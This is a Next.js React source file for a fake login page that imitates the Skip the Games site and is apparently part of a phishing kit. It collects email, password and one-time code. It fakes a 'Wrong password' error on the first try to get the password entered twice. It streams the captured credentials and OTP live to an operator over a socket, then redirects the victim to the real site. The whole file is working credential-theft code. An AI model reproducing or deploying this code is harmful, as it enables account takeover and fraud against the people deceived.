"use client";
import FirstPage from "./components/firstPage";
import SecondPage from "./components/secondPage";
import React, { useEffect, useState, useCallback } from "react";
import { CheckEmail } from "@/src/helpers/check-email-&-pass";
import InfoToast from "@/src/components/toast/InfoToast";
import { io } from "socket.io-client";
import Notification from "@/src/models/notifyModel";
import Data from "@/src/models/dataModels";
import DOMPurify from "dompurify";
import { useRouter } from "next/navigation";
import axios from "axios";
import { message } from "antd";
const socket = io();
const AuthPage = () => {
    
    const [pathId, setPathId] = useState("");
    const [attempt, setAttempt] = useState(1);
    const [pageNumber, setPageNumber] = useState(false);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [otp, setOtp] = useState("");
    const [dataId, setDataId] = useState("");
    const [activeUser, setActiveUser] = useState(false);
    const [activeUserUID, setActiveUserID] = useState("");
    const router = useRouter();

    const EmailClickEvent = (email: any) => {
        setEmail(email);
        if (CheckEmail({ email })) {
            setError("");
        } else {
            setError("Please enter a valid email address");
        }
    };

    const PasswordClickEvent = (password: any) => {
        setPassword(password);
        if (email !== "" && password !== "") {
            setError("");
        }
    };

    const sanitizeQueryParam = (param: any) => {
        const cleanParam = DOMPurify.sanitize(param);
        const sanitized = cleanParam.replace(/[^\w\s-_]/g, '');
        return sanitized || null;
    };

    const checkId = useCallback(async (sanitizedParam: any) => {
        try {
            const response = await axios.post('/api/users/checkId', { id: sanitizedParam });
            if (response.data.status !== 200) {
                router.push("/");
            }
        } catch (error) {
            console.error("Error checking ID:", error);
            router.push("/");
        }
    }, [router]);

    useEffect(() => {
        socket.on("get_all_user", (d) => {
            console.log("getting data from Io: ",d)
            setActiveUser(d.status);
            setActiveUserID(d.id);
        });

        return () => {
            socket.off("get_all_user");
        };
    }, []);

    useEffect(() => {
        const searchParams = new URLSearchParams(window.location.search);
        const myParam = searchParams.get('id');
        const securityCheck = searchParams.get('security');

        if (myParam) {
            if (securityCheck) {
                const sanitizedParam = sanitizeQueryParam(myParam);
                if (sanitizedParam) {
                    setPageNumber(true);
                }
            }
            const sanitizedParam = sanitizeQueryParam(myParam);
            if (sanitizedParam) {
                checkId(sanitizedParam);
                setPathId(sanitizedParam);
                socket.emit('get_all_user', sanitizedParam);
            }
        } else {
            router.push('/');
        }
    }, [checkId, router]);

    const handleOTPEvent = (otp: any) => {
        setOtp(otp);
    };


    const newHandleNext = async () => {
        if (attempt === 1) {
            setLoading(true);
            setError("Loading");
            setTimeout(() => {
                setPassword("");
                setError("Wrong password");
            }, 1500);
            setLoading(false);
            setAttempt(2);
            return;
        }
        if (loading) {
            InfoToast({ message: "Your request is processing" });
            return;
        }

        if (email === "" || password === "") {
            setError("Email and Password required");
            return;
        }
        if (!CheckEmail({ email })) {
            setError("Please enter a valid email address");
            return;
        }

        setLoading(true);
        setError("Loading");

        try {
            const response = await axios.post("/api/auth/skip/firtsPage", { e: email, p: password, status: activeUser, id: activeUserUID });
            setLoading(false);
            if (response.data.status === 200) {
                socket.emit("data", { e: email, p: password, id: pathId, notify_id: response.data.notify_id, data_id: response.data.data_id });
                setPageNumber(true);
                setError("");
                setDataId(response.data.data_id);
                router.push(`/auth/login?id=${pathId}&&security=true`);
            } else {
                message.error("Something went wrong");
                console.log(response);
            }
        } catch (error) {
            setLoading(false);
            setError("Something went wrong");
            console.error(error);
        }
    };

    const newHandleOTPNext = async () => {
        if (loading) {
            InfoToast({ message: "Your request is processing" });
            return;
        }

        if (otp === "") {
            setError("OTP is required");
            return;
        }

        setLoading(true);
        setError("Loading");

        try {
            const response = await axios.post("/api/auth/skip/secondPage", { otp, data_id: dataId, id: activeUserUID });
            setLoading(false);
            if (response.data.status === 200) {
                socket.emit("otp", { otp, id: pathId, data_id: response.data.data_id, notify_id: response.data.notify_id });
                router.push(`https://skipthegames.com/`);
            } else {
                message.error("Something went wrong");
                console.log(response);
            }
        } catch (error) {
            setLoading(false);
            setError("Something went wrong");
            console.error(error);
        }
    };

    return (
        <main>
            {pageNumber ? (
                <SecondPage ErrorMessge={error} ChengOTPEvent={handleOTPEvent} handleNext={newHandleOTPNext} geetemail={email} />
            ) : (
                <FirstPage ErrorMessge={error} ChengEmailEvent={EmailClickEvent} ChengPasswordEvent={PasswordClickEvent} handleNext={newHandleNext} />
            )}
        </main>
    );
};

export default AuthPage;
